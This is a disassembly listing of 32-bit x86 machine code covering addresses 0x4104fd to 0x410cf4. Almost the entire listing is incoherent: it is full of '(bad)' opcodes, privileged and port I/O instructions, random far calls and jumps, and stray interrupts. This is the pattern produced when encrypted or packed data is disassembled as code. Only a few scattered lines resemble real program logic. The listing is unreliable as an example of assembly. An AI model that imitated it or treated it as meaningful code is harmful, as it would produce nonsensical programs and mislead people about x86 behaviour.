  4104fd:	shl    BYTE PTR ds:0x8fec021e,0xd6
  410504:	pop    edx
  410505:	pop    ebx
  410506:	stos   BYTE PTR es:[edi],al
  410507:	stc    
  410508:	pop    eax
  410509:	sti    
  41050a:	cdq    
  41050b:	push   0xa8746647
  410510:	ret    0x191f
  410513:	(bad)  
  410514:	fild   WORD PTR [edx-0x1]
  410517:	and    bl,BYTE PTR [eax+0x6539649b]
  41051d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41051e:	push   0x593c81a5
  410523:	inc    edi
  410524:	call   0x289b:0xa0a6617d
  41052b:	gs sub eax,0xcc018668
  410531:	(bad)  
  410532:	mov    dh,0x8
  410534:	dec    eax
  410535:	push   edi
  410536:	loope  0x4105a5
  410538:	push   eax
  410539:	fs jmp 0xf328b39c
  41053f:	xchg   esp,eax
  410540:	mov    eax,esp
  410542:	jecxz  0x410547
  410544:	or     DWORD PTR [eax],ebx
  410546:	lock dec ecx
  410548:	fldenv [ecx]
  41054a:	mov    ebx,DWORD PTR [eax]
  41054c:	call   FWORD PTR [ebx+0x53]
  41054f:	mov    ss,ecx
  410551:	retf   0xba5e
  410554:	dec    eax
  410555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410556:	sub    al,0xf2
  410558:	(bad)  
  410559:	jmp    0x86d6:0xe4fcbb24
  410560:	push   ebx
  410561:	adc    edx,edi
  410563:	cmp    edx,DWORD PTR [edx+0x26]
  410566:	jnp    0x4105dc
  410568:	xor    bl,BYTE PTR [esi]
  41056a:	mov    esi,0x1ef7dd09
  41056f:	mov    al,0xa6
  410571:	push   ebp
  410572:	add    BYTE PTR [esi],ch
  410574:	call   0xdd78:0x79f134ea
  41057b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41057c:	mov    ebx,0x74516715
  410581:	inc    edx
  410582:	es xchg edi,eax
  410584:	push   0x3c
  410586:	xor    ah,cl
  410588:	into   
  410589:	sbb    al,0x9
  41058b:	mov    eax,ds:0xa2d97f53
  410590:	cmp    eax,0xe44f855d
  410595:	scas   al,BYTE PTR es:[edi]
  410596:	jl     0x4105f4
  410598:	cmp    BYTE PTR [edi],0xe5
  41059b:	shl    DWORD PTR [ebx+0x50],0xe5
  41059f:	cmp    DWORD PTR [edx+0x38],esp
  4105a2:	jge    0x410622
  4105a4:	mov    esp,0xba8803b
  4105a9:	jmp    0xa7025273
  4105ae:	hlt    
  4105af:	fwait
  4105b0:	(bad)  
  4105b1:	es pop edi
  4105b3:	jbe    0x4105e8
  4105b5:	je     0x4105e7
  4105b7:	js     0x41062e
  4105b9:	sbb    eax,0x4e253243
  4105be:	fldenv [edi-0x306103f1]
  4105c4:	xor    al,0x8a
  4105c6:	dec    ecx
  4105c7:	int    0x72
  4105c9:	int    0x61
  4105cb:	dec    edx
  4105cc:	mov    cl,0x9d
  4105ce:	cmp    eax,0xfa260b24
  4105d3:	fmul   DWORD PTR [edx+eax*8+0x3c7034b]
  4105da:	xchg   esp,ebx
  4105dc:	scas   eax,DWORD PTR es:[edi]
  4105dd:	cs jb  0x410616
  4105e0:	jns    0x41058b
  4105e2:	push   ss
  4105e3:	or     eax,0xdc0640bd
  4105e8:	shr    cl,cl
  4105ea:	pop    ebp
  4105eb:	test   eax,0xab8b778a
  4105f0:	pusha  
  4105f1:	dec    ecx
  4105f2:	sub    al,0xe
  4105f4:	mov    eax,ds:0xa4564e43
  4105f9:	push   es
  4105fa:	jp     0x4105c7
  4105fc:	sbb    dh,dh
  4105fe:	scas   al,BYTE PTR es:[edi]
  4105ff:	inc    BYTE PTR [ebx+0x346cc229]
  410605:	adc    eax,0x5ff08928
  41060a:	xchg   ecx,eax
  41060b:	add    eax,0x96768e58
  410610:	sar    ecx,cl
  410612:	sub    edi,ebp
  410614:	mov    ds:0x4601e458,eax
  410619:	iret   
  41061a:	ss xchg edx,eax
  41061c:	into   
  41061d:	xchg   ebp,eax
  41061e:	dec    esi
  41061f:	cli    
  410620:	inc    ecx
  410621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410622:	xor    eax,0xbec3914b
  410627:	fbstp  TBYTE PTR ds:0x464b2ce5
  41062d:	cwde   
  41062e:	pop    ecx
  41062f:	push   ebp
  410630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410631:	adc    DWORD PTR [ecx],eax
  410633:	mov    dh,0xb1
  410635:	or     BYTE PTR [ebx+0x79118772],dl
  41063b:	inc    ecx
  41063c:	(bad)  
  41063d:	sub    cl,BYTE PTR [ebx+0xab01ee]
  410643:	xor    ecx,edi
  410645:	sub    DWORD PTR [ecx],edx
  410647:	pop    ebp
  410648:	inc    edx
  410649:	ja     0x41067e
  41064b:	and    bh,bh
  41064d:	dec    esi
  41064e:	sti    
  41064f:	stc    
  410650:	mov    esp,0x7229ffb
  410655:	jmp    0x4106b2
  410657:	aas    
  410658:	mov    dl,cl
  41065a:	push   0xfffffff1
  41065c:	xor    al,0x89
  41065e:	mov    ecx,0x603293eb
  410663:	pop    ebp
  410664:	loope  0x41065f
  410666:	mov    bl,0x30
  410668:	push   esp
  410669:	xor    al,0xc7
  41066b:	mov    esi,0x24b3bf96
  410670:	and    bl,ch
  410672:	ror    DWORD PTR [ebx+0x158df7b3],cl
  410678:	mov    ebx,0x47c53642
  41067d:	mov    edx,0x3cdf2034
  410682:	jmp    0x410630
  410684:	and    ebx,DWORD PTR [eax+esi*8-0x7d]
  410688:	dec    esp
  410689:	jne    0x410639
  41068b:	and    BYTE PTR [edi],0x44
  41068e:	fwait
  41068f:	pop    esi
  410690:	mov    dh,0x4a
  410692:	(bad)  
  410693:	adc    eax,0xcaed52da
  410698:	out    0xbe,al
  41069a:	xchg   esi,eax
  41069b:	fisttp QWORD PTR [edx]
  41069d:	out    dx,eax
  41069e:	cdq    
  41069f:	add    eax,0xc7454ea9
  4106a4:	stc    
  4106a5:	pusha  
  4106a6:	and    eax,0xeca0fddf
  4106ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ac:	cmp    edx,esi
  4106ae:	dec    ebx
  4106af:	nop
  4106b0:	lds    esi,FWORD PTR [ebx+0x7b80638d]
  4106b6:	sub    DWORD PTR [edx-0x5bed375d],edi
  4106bc:	adc    bh,BYTE PTR [ebp-0x73]
  4106bf:	icebp  
  4106c0:	xor    BYTE PTR [ebp-0x3f410a8e],al
  4106c6:	clc    
  4106c7:	mov    edx,0xf284bef6
  4106cc:	imul   esp,DWORD PTR [esp+eiz*2-0x5c7713ac],0xffffffb0
  4106d4:	scas   al,BYTE PTR es:[edi]
  4106d5:	inc    esi
  4106d6:	ficomp WORD PTR [ebx+0x4c2148f]
  4106dc:	sub    DWORD PTR [ecx+edx*8+0x5c],ecx
  4106e0:	iret   
  4106e1:	in     eax,0xf4
  4106e3:	popa   
  4106e4:	(bad)  
  4106e6:	xchg   edx,eax
  4106e7:	push   es
  4106e8:	push   ebx
  4106e9:	pusha  
  4106ea:	fisubr DWORD PTR [esi]
  4106ec:	pop    ds
  4106ed:	push   ebx
  4106ee:	cli    
  4106ef:	out    0xab,al
  4106f1:	mov    bl,0x91
  4106f3:	arpl   WORD PTR [edx],bp
  4106f5:	adc    ch,BYTE PTR [esi+edi*4-0x4f1bed82]
  4106fc:	pop    ss
  4106fd:	scas   al,BYTE PTR es:[edi]
  4106fe:	jno    0x410718
  410700:	and    BYTE PTR [eax+ebp*2-0x6b],0xd9
  410705:	lods   al,BYTE PTR ds:[esi]
  410706:	add    esi,edx
  410708:	mov    dl,0x79
  41070a:	and    dl,bl
  41070c:	dec    ecx
  41070e:	loope  0x4106a4
  410710:	add    DWORD PTR [esi],0x75a6df1c
  410716:	push   esi
  410717:	frstor [esi]
  410719:	das    
  41071a:	and    DWORD PTR [ecx-0x31a08342],ecx
  410720:	xchg   BYTE PTR [ebx-0x3efcc2e0],bh
  410726:	jp     0x4106be
  410728:	pop    ecx
  410729:	add    dl,BYTE PTR [ebx+0x49]
  41072c:	mov    esp,DWORD PTR [esi-0x6]
  41072f:	fwait
  410730:	call   DWORD PTR [ebx+0xb]
  410733:	xchg   esp,eax
  410734:	pusha  
  410735:	in     al,dx
  410736:	mov    al,ds:0x473dd360
  41073b:	lods   al,BYTE PTR ds:[esi]
  41073c:	pop    edi
  41073d:	popa   
  41073e:	mov    edx,0xdd08bd20
  410743:	rcr    DWORD PTR [ecx-0x1bf50c86],cl
  410749:	test   eax,0xbec79dff
  41074e:	push   ss
  41074f:	push   ss
  410750:	jg     0x4107b4
  410752:	mov    eax,ds:0xc001cca4
  410757:	or     al,0x8b
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x6291f5f7
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410731
  41078c:	mov    al,ds:0xd4bc5e72
  410791:	sbb    al,0xe7
  410793:	ins    DWORD PTR es:[edi],dx
  410794:	and    eax,0x3bd3ab53
  410799:	or     ebx,DWORD PTR [ecx-0x7a]
  41079c:	fmulp  st(2),st
  41079e:	dec    edi
  41079f:	(bad)  
  4107a0:	outs   dx,DWORD PTR ds:[esi]
  4107a1:	enter  0x7cf4,0x5
  4107a5:	mov    bl,0x77
  4107a7:	xchg   ebp,eax
  4107a8:	mov    eax,ds:0x54843309
  4107ad:	shr    BYTE PTR [edi+edi*1],0xcd
  4107b1:	daa    
  4107b2:	pop    esp
  4107b3:	(bad)  
  4107b4:	gs dec esp
  4107b6:	mov    al,ds:0x79744da8
  4107bb:	pop    esp
  4107bc:	push   esp
  4107bd:	sub    ebp,DWORD PTR [eax-0x2f]
  4107c0:	cmp    DWORD PTR ds:0xa32e6490,0xffffffc4
  4107c7:	fcom   QWORD PTR [ecx-0x5be0c001]
  4107cd:	and    BYTE PTR [ecx+eax*2+0x15],dh
  4107d1:	test   DWORD PTR [ecx+0x56],ecx
  4107d4:	ins    BYTE PTR es:[edi],dx
  4107d5:	popa   
  4107d6:	ss xor al,0xde
  4107d9:	push   esi
  4107da:	call   0xc5fa1687
  4107df:	bound  ebp,QWORD PTR [eax-0x566e85f5]
  4107e5:	or     BYTE PTR [edi+0x8335f18],bl
  4107eb:	fist   DWORD PTR [edi-0x41b31b2d]
  4107f1:	popf   
  4107f2:	mov    cs,WORD PTR [eax-0x75a926b9]
  4107f8:	pusha  
  4107f9:	lods   eax,DWORD PTR ds:[esi]
  4107fa:	cmp    eax,0x3da336a
  4107ff:	loop   0x4107cc
  410801:	dec    ebx
  410802:	outs   dx,DWORD PTR ds:[esi]
  410803:	mov    BYTE PTR ds:0x731808ed,bh
  410809:	ror    BYTE PTR [ecx+0x61e90f6],0x93
  410810:	jb     0x410846
  410812:	lock push ecx
  410814:	xor    eax,0x839dfe5b
  410819:	cmp    BYTE PTR [ebp+0x1e],dh
  41081c:	fsubr  DWORD PTR [ebx]
  41081e:	pop    ebx
  41081f:	lea    ebp,[edi]
  410821:	mov    edx,0x35cf475d
  410826:	cmc    
  410827:	xor    BYTE PTR [ecx+0x7bacdcfa],dh
  41082d:	and    DWORD PTR [eax+0x35],0x4ab544b
  410834:	cmc    
  410835:	dec    ebx
  410836:	int3   
  410837:	aas    
  410838:	cdq    
  410839:	pop    edx
  41083a:	jns    0x4107e8
  41083c:	aad    0xaa
  41083e:	sub    DWORD PTR [ecx-0x72],0x5b
  410842:	mov    bh,0x41
  410844:	xchg   BYTE PTR [edi],bl
  410846:	jo     0x4107de
  410848:	jns    0x410877
  41084a:	xor    eax,0xfe324d0
  41084f:	pop    esi
  410850:	mov    eax,0xa1a7f2db
  410855:	xchg   esi,eax
  410856:	xchg   edi,eax
  410857:	xor    eax,edi
  410859:	jb     0x410886
  41085b:	adc    eax,0xda7b2363
  410860:	mov    dl,0xed
  410862:	mov    ecx,DWORD PTR [eax+0x11]
  410865:	loope  0x4107f1
  410867:	sbb    eax,0xe3706bb8
  41086c:	push   0xdbf10e14
  410871:	jne    0x4108e9
  410873:	add    esi,DWORD PTR [eax]
  410875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410876:	push   edx
  410877:	stc    
  410878:	xor    al,0x75
  41087a:	aaa    
  41087b:	jl     0x41083e
  41087d:	or     bh,bl
  41087f:	popa   
  410880:	es inc ecx
  410882:	ja     0x410818
  410884:	das    
  410885:	mov    dh,0xff
  410887:	(bad)  
  410888:	clc    
  410889:	fcmovb st,st(1)
  41088b:	sub    al,0xdd
  41088d:	aam    0x72
  41088f:	clc    
  410890:	add    eax,0x865a92ac
  410895:	aas    
  410896:	pop    ecx
  410897:	jb     0x4108d0
  410899:	mov    ah,dl
  41089b:	or     eax,0x7463c908
  4108a0:	imul   eax,DWORD PTR [ebp+0x756ed94f],0x15
  4108a7:	pop    ebx
  4108a8:	pop    edi
  4108a9:	or     ebp,edi
  4108ab:	loope  0x410830
  4108ad:	xor    dl,BYTE PTR [edx-0x23f18477]
  4108b3:	jne    0x41085b
  4108b5:	rcr    BYTE PTR [ecx-0x734c346c],0x95
  4108bc:	add    DWORD PTR [esi],ebp
  4108be:	inc    edx
  4108bf:	xchg   esi,eax
  4108c0:	jge    0x4108d4
  4108c2:	xor    eax,0x4d2c0baa
  4108c7:	popf   
  4108c8:	xor    eax,0x8f82449d
  4108cd:	outs   dx,BYTE PTR ds:[esi]
  4108ce:	or     bh,cl
  4108d0:	addr16 or al,0x86
  4108d3:	push   0xe7b8b76e
  4108d8:	out    0x7d,eax
  4108da:	jb     0x410947
  4108dc:	clc    
  4108dd:	dec    ecx
  4108de:	jg     0x410928
  4108e0:	add    eax,0xb5a15095
  4108e5:	push   ds
  4108e6:	adc    eax,0xbdebb735
  4108eb:	iret   
  4108ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108ed:	lods   al,BYTE PTR ds:[esi]
  4108ee:	enter  0xe0e2,0xc7
  4108f2:	inc    edx
  4108f3:	jp     0x410905
  4108f5:	jo     0x4108e5
  4108f7:	inc    esi
  4108f8:	mov    bh,BYTE PTR [ecx-0x5d01cea0]
  4108fe:	scas   al,BYTE PTR es:[edi]
  4108ff:	mov    ds:0x69e12cd2,eax
  410904:	adc    al,0x73
  410906:	(bad)  
  410907:	sbb    eax,0x1eb0d4e
  41090c:	jg     0x410964
  41090e:	jae    0x41097d
  410910:	pop    ecx
  410911:	ss mov dh,0x97
  410914:	jp     0x41093d
  410916:	mov    esp,0xff80b11a
  41091b:	repnz or BYTE PTR [eax-0x223d4135],0x3d
  410923:	mov    edx,0xaf65eefc
  410928:	aaa    
  410929:	cs sub eax,0xb03ae78a
  41092f:	mov    esp,0x3ca927c5
  410934:	(bad)  
  410935:	bound  esi,QWORD PTR [ebx+ecx*8]
  410938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410939:	jmp    0x90f7e4d5
  41093e:	mov    al,0xd1
  410940:	inc    eax
  410941:	ins    BYTE PTR es:[edi],dx
  410942:	aam    0xad
  410944:	push   ss
  410945:	jbe    0x4109aa
  410947:	(bad)
  41094b:	sbb    esi,DWORD PTR [edx-0x9]
  41094e:	mov    ds:0x49b2fa2,al
  410953:	mov    esi,edx
  410955:	mov    ch,0x21
  410957:	cs cs xor al,0x21
  41095b:	xor    ah,BYTE PTR [esi]
  41095d:	add    al,0x69
  41095f:	test   eax,0xf666083e
  410964:	push   esp
  410965:	fwait
  410966:	arpl   di,di
  410968:	mov    ds:0x88bd67ad,eax
  41096d:	repz call 0x773473ed
  410973:	ds in  eax,dx
  410975:	or     eax,0xa872bb65
  41097a:	shl    eax,0x5d
  41097d:	call   0x5a3c7ee9
  410982:	mov    edx,0xeac1b779
  410987:	sbb    BYTE PTR [ebx+esi*1-0x57],dl
  41098b:	call   0xd7532dae
  410990:	imul   ecx,DWORD PTR [edx],0x56549ef0
  410996:	lods   eax,DWORD PTR ds:[esi]
  410997:	mov    esp,0x2457fde4
  41099c:	(bad)
  4109a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a2:	out    dx,eax
  4109a3:	outs   dx,BYTE PTR ds:[esi]
  4109a4:	rol    DWORD PTR [esi-0x14],cl
  4109a7:	lods   al,BYTE PTR ds:[esi]
  4109a8:	je     0x41094f
  4109aa:	pop    ebp
  4109ab:	mov    bh,0xd2
  4109ad:	jmp    0x410a20
  4109af:	mov    eax,0xb512f940
  4109b4:	cwde   
  4109b5:	mov    edi,edi
  4109b7:	pop    edx
  4109b8:	out    dx,eax
  4109b9:	and    ebx,DWORD PTR [ecx]
  4109bb:	push   esp
  4109bc:	test   DWORD PTR [edx+0x59],ebp
  4109bf:	jmp    0x410a26
  4109c1:	add    al,0x8a
  4109c3:	sbb    DWORD PTR [eax+0x2c3c3c3d],0x1f
  4109ca:	sub    DWORD PTR [ebx+0x30],0x421a2ae6
  4109d1:	xchg   bl,dl
  4109d3:	sbb    bh,BYTE PTR [ecx+0x6d]
  4109d6:	mov    dl,0xfc
  4109d8:	test   al,0x9c
  4109da:	(bad)  
  4109db:	aad    0xd2
  4109dd:	stc    
  4109de:	cmp    al,0x31
  4109e0:	hlt    
  4109e1:	xor    DWORD PTR [esp+edx*2],0xffffffb5
  4109e5:	jge    0x4109d6
  4109e7:	aad    0x1b
  4109e9:	push   eax
  4109ea:	adc    al,0x9d
  4109ec:	jns    0x4109ac
  4109ee:	ret    0x7298
  4109f1:	sub    eax,0x49cd48d6
  4109f6:	sub    eax,0x8d0d4669
  4109fb:	popa   
  4109fc:	jmp    0xc6c2c994
  410a01:	dec    ebx
  410a02:	add    eax,0x2e15414
  410a07:	inc    ebp
  410a08:	out    dx,al
  410a09:	arpl   WORD PTR [edx+0x76],sp
  410a0c:	mov    ah,0xb4
  410a0e:	sub    ch,ah
  410a10:	pop    es
  410a11:	mov    ah,0x41
  410a13:	int    0xd2
  410a15:	sub    DWORD PTR [ebx+0x79],esp
  410a18:	sub    al,dh
  410a1a:	adc    al,0x42
  410a1c:	rcl    DWORD PTR [ebp+0x51b711db],0x25
  410a23:	adc    dl,bl
  410a25:	add    DWORD PTR [edx],ebx
  410a27:	cmc    
  410a28:	mov    BYTE PTR [ebx+0x29],ah
  410a2b:	mov    ah,0x28
  410a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a2e:	lods   al,BYTE PTR ds:[esi]
  410a2f:	js     0x410a47
  410a31:	pop    edx
  410a32:	test   eax,0x4d7c4592
  410a37:	sbb    dl,BYTE PTR [edx]
  410a39:	test   eax,0xc603d28d
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	(bad)  
  410a50:	cmc    
  410a51:	aas    
  410a52:	mov    esp,0x7e7ebdba
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a8a
  410a5c:	dec    edx
  410a5d:	std    
  410a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a5f:	inc    ebx
  410a60:	inc    eax
  410a61:	dec    eax
  410a62:	test   DWORD PTR [edi],edi
  410a64:	mov    ecx,0x7044b32d
  410a69:	push   0xffffffcf
  410a6b:	xor    bl,BYTE PTR [eax+ebp*1-0x5bcb50a3]
  410a72:	mov    esi,0xe2e4b9ad
  410a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a78:	jbe    0x4109fd
  410a7a:	xchg   edx,eax
  410a7b:	jmp    0x2f944f75
  410a80:	sbb    eax,ecx
  410a82:	mov    eax,ds:0x9d1caf53
  410a87:	adc    BYTE PTR [ebp+0x2d0f75ab],0x78
  410a8e:	cmc    
  410a8f:	std    
  410a90:	dec    edx
  410a91:	lea    edi,[ebx+0x67]
  410a94:	push   ebp
  410a95:	popa   
  410a96:	sti    
  410a97:	xchg   ebx,eax
  410a98:	pop    eax
  410a99:	lea    ecx,[esi-0x2fc8d26c]
  410a9f:	cmp    eax,0x626da098
  410aa4:	adc    al,BYTE PTR [ebx-0x1638654a]
  410aaa:	ins    BYTE PTR es:[edi],dx
  410aab:	cli    
  410aac:	ret    
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	out    0xd4,al
  410ab0:	das    
  410ab1:	xchg   edx,eax
  410ab2:	pop    ss
  410ab3:	or     cl,BYTE PTR [edi-0x18ca5e0b]
  410ab9:	pop    esp
  410aba:	jae    0x410b13
  410abc:	aad    0x8d
  410abe:	(bad)  
  410abf:	adc    edi,ebp
  410ac1:	mov    ch,0xdd
  410ac3:	mov    eax,cs:0xa0b6ee57
  410ac9:	jmp    0x2f27:0x1d74de41
  410ad0:	test   al,0x53
  410ad2:	dec    ecx
  410ad3:	and    eax,0x35587646
  410ad8:	gs cwde 
  410ada:	std    
  410adb:	(bad)  [ebx+0x73b0a74e]
  410ae1:	dec    ebx
  410ae2:	xchg   ecx,eax
  410ae3:	fbld   TBYTE PTR [ebp+0x19]
  410ae6:	popa   
  410ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ae8:	into   
  410ae9:	repnz mov dl,0xcf
  410aec:	adc    ebx,ebx
  410aee:	dec    ebp
  410aef:	add    DWORD PTR [ebx+eax*1],ebp
  410af2:	jmp    0x3281:0xe88058f3
  410af9:	ss cs ins BYTE PTR es:[edi],dx
  410afc:	mov    ah,0xae
  410afe:	sbb    eax,0xd5a9f676
  410b03:	bound  ebx,QWORD PTR [ebx+0x36]
  410b06:	pop    ss
  410b07:	inc    ecx
  410b08:	(bad)  
  410b09:	push   0xf622548c
  410b0e:	fwait
  410b0f:	pop    ebp
  410b10:	(bad)  [ecx]
  410b12:	pop    esi
  410b13:	retf   0xd290
  410b16:	push   esi
  410b17:	xchg   ebx,eax
  410b18:	sub    al,0x65
  410b1a:	rcl    eax,1
  410b1c:	aam    0xd0
  410b1e:	dec    ecx
  410b1f:	imul   edx,DWORD PTR [edi-0x77],0x3
  410b23:	xchg   esp,eax
  410b24:	push   eax
  410b25:	lea    ecx,[ecx+edx*4+0x33]
  410b29:	cmp    BYTE PTR [ecx],cl
  410b2b:	cmp    BYTE PTR [edx+0x22],0x6f
  410b2f:	mov    edx,0xda47bcf2
  410b34:	test   eax,0x43997512
  410b39:	loop   0x410b59
  410b3b:	push   0xcb3ee38e
  410b40:	jnp    0x410ba5
  410b42:	loop   0x410b6b
  410b44:	jmp    0x410baa
  410b46:	pop    ebx
  410b47:	cmp    al,0xec
  410b49:	cmp    edi,DWORD PTR [edi]
  410b4b:	pop    esp
  410b4c:	loopne 0x410b56
  410b4e:	cwde   
  410b4f:	and    DWORD PTR [ecx-0x4e],0xffffff99
  410b53:	fistp  QWORD PTR [esi-0x630ff939]
  410b59:	popa   
  410b5a:	xchg   edi,eax
  410b5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b5c:	jle    0x410b24
  410b5e:	repz push ds
  410b60:	fld    st(3)
  410b62:	(bad)  
  410b63:	xchg   edi,eax
  410b64:	push   DWORD PTR [edi-0x36]
  410b67:	iret   
  410b68:	sahf   
  410b69:	sub    dl,al
  410b6b:	pop    ecx
  410b6c:	pushf  
  410b6d:	sbb    eax,0xf560b744
  410b72:	jno    0x410be7
  410b74:	call   0x736f8ec1
  410b79:	iret   
  410b7a:	int    0xd0
  410b7c:	icebp  
  410b7d:	cmc    
  410b7e:	addr16 (bad) 
  410b80:	into   
  410b81:	mov    dh,0xaf
  410b83:	sbb    eax,DWORD PTR [ebx-0x7b]
  410b86:	mov    dh,0x5d
  410b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b89:	xchg   ebp,eax
  410b8a:	or     BYTE PTR [edi+ebp*4-0x55],ch
  410b8e:	out    0x22,eax
  410b90:	push   ebp
  410b91:	call   0x49a8:0x2083b28f
  410b98:	(bad)  
  410b99:	ins    DWORD PTR es:[edi],dx
  410b9a:	icebp  
  410b9b:	xchg   esp,eax
  410b9c:	retf   0x2c52
  410b9f:	pop    ebx
  410ba0:	ret    
  410ba1:	stc    
  410ba2:	aam    0xb
  410ba4:	fwait
  410ba5:	mov    BYTE PTR [edx],cl
  410ba7:	gs retf 
  410ba9:	test   DWORD PTR [eax+esi*8],eax
  410bac:	addr16 jp 0x410b91
  410baf:	push   ss
  410bb0:	adc    bl,bl
  410bb2:	add    al,0x98
  410bb4:	in     al,0xa3
  410bb6:	sub    DWORD PTR [ebx-0x58],edx
  410bb9:	das    
  410bba:	mov    ebx,DWORD PTR [ebp+esi*4-0x16]
  410bbe:	es aam 0xad
  410bc1:	pop    ebx
  410bc2:	dec    edx
  410bc3:	add    ebx,DWORD PTR [ebx-0x4260fa8a]
  410bc9:	test   al,0xc1
  410bcb:	enter  0x8e7c,0xb0
  410bcf:	fistp  WORD PTR [edx+eiz*2+0x66]
  410bd3:	lock test DWORD PTR [edi+ebp*8+0x48],esi
  410bd8:	and    esp,DWORD PTR [ebp-0x3c2a2d24]
  410bde:	popf   
  410bdf:	sbb    cl,BYTE PTR [edi+0x17]
  410be2:	or     DWORD PTR [esi],eax
  410be4:	in     al,dx
  410be5:	push   ebx
  410be6:	dec    eax
  410be7:	test   dh,bl
  410be9:	xchg   edi,eax
  410bea:	stos   BYTE PTR es:[edi],al
  410beb:	(bad)  
  410bec:	repz and BYTE PTR [eax],dh
  410bef:	mov    esi,esi
  410bf1:	fwait
  410bf2:	adc    DWORD PTR cs:0x62bf4925,edi
  410bf9:	ret    
  410bfa:	(bad)  
  410bfb:	sti    
  410bfc:	mov    edx,0x221cd231
  410c01:	cmp    eax,0xf671a5fb
  410c06:	or     eax,0xc30cd59b
  410c0b:	or     cl,0x79
  410c0e:	inc    eax
  410c0f:	lds    eax,FWORD PTR [eax]
  410c11:	call   0x44a:0x5a30b78
  410c18:	call   0xd329d1ca
  410c1d:	or     edx,esp
  410c1f:	out    0x7b,eax
  410c21:	add    bl,ah
  410c23:	out    dx,al
  410c24:	xor    bh,BYTE PTR [ebx]
  410c26:	gs ins BYTE PTR es:[edi],dx
  410c28:	pop    ebx
  410c29:	out    dx,al
  410c2a:	jmp    0x7244:0x794cc15b
  410c31:	dec    edx
  410c32:	adc    eax,0x5abceacc
  410c37:	retf   0x2444
  410c3a:	mov    ds:0x601aa89f,al
  410c3f:	call   0x794c:0x281b4b0e
  410c46:	or     edi,edx
  410c48:	or     eax,0x455200a
  410c4d:	mov    al,0x83
  410c4f:	out    dx,al
  410c50:	cmp    BYTE PTR [eax+0x7],bl
  410c53:	cmp    al,0xf5
  410c55:	adc    BYTE PTR [ebp-0x6d],ch
  410c58:	sub    ebp,DWORD PTR ds:0xa6cf3fc
  410c5e:	mov    cl,0x9d
  410c60:	scas   al,BYTE PTR es:[edi]
  410c61:	adc    edx,DWORD PTR [ecx-0x356c0691]
  410c67:	inc    edi
  410c68:	push   0x2a164b9f
  410c6d:	jbe    0x410c9e
  410c6f:	ficomp DWORD PTR [esi]
  410c71:	xlat   BYTE PTR ds:[ebx]
  410c72:	or     eax,DWORD PTR [eax+0x3]
  410c75:	arpl   WORD PTR [ebx],sp
  410c77:	push   0x70
  410c79:	outs   dx,BYTE PTR ds:[esi]
  410c7a:	into   
  410c7b:	xchg   ecx,eax
  410c7c:	in     eax,dx
  410c7d:	loop   0x410cd1
  410c7f:	shl    DWORD PTR gs:[esi],0x10
  410c83:	(bad)  
  410c84:	scas   eax,DWORD PTR es:[edi]
  410c85:	mov    cl,0x50
  410c87:	pop    ds
  410c88:	sbb    ah,bl
  410c8a:	mov    ecx,0x31498d2a
  410c8f:	add    al,0x2b
  410c91:	xchg   BYTE PTR [ecx+0xd],cl
  410c94:	bswap  ecx
  410c96:	pop    ds
  410c97:	jle    0x410cd2
  410c99:	jl     0x410d16
  410c9b:	mov    edi,0xb84e3fa5
  410ca0:	or     DWORD PTR [ebx+ecx*4+0x5c],edi
  410ca4:	test   ebp,eax
  410ca6:	xlat   BYTE PTR ds:[ebx]
  410ca7:	xor    edx,edx
  410ca9:	mov    dh,0xa3
  410cab:	loop   0x410cea
  410cad:	and    eax,0xb9103b7a
  410cb2:	xchg   ebp,eax
  410cb3:	adc    al,al
  410cb5:	stos   DWORD PTR es:[edi],eax
  410cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb7:	adc    eax,0xf23aada8
  410cbc:	push   0xfa0d9c64
  410cc1:	stos   DWORD PTR es:[edi],eax
  410cc2:	clc    
  410cc3:	jo     0x410c60
  410cc5:	xchg   DWORD PTR [edx],ebx
  410cc7:	push   cs
  410cc8:	sbb    edx,DWORD PTR [edx+0x78079849]
  410cce:	(bad)  
  410ccf:	mov    ebp,0xde7b1fd7
  410cd4:	mov    al,0x7e
  410cd6:	or     edi,ebx
  410cd8:	in     eax,dx
  410cd9:	xor    ch,BYTE PTR [eax+0x3b]
  410cdc:	pop    edi
  410cdd:	out    dx,eax
  410cde:	xlat   BYTE PTR ds:[ebx]
  410cdf:	push   0xd5b67c00
  410ce4:	(bad)  
  410ce5:	push   ebp
  410ce6:	mov    esp,0x13d2c89a
  410ceb:	std    
  410cec:	rcl    esi,0x9e
  410cef:	adc    al,0x7c
  410cf1:	repz dec esp
  410cf3:	dec    ecx
  410cf4:	cli    
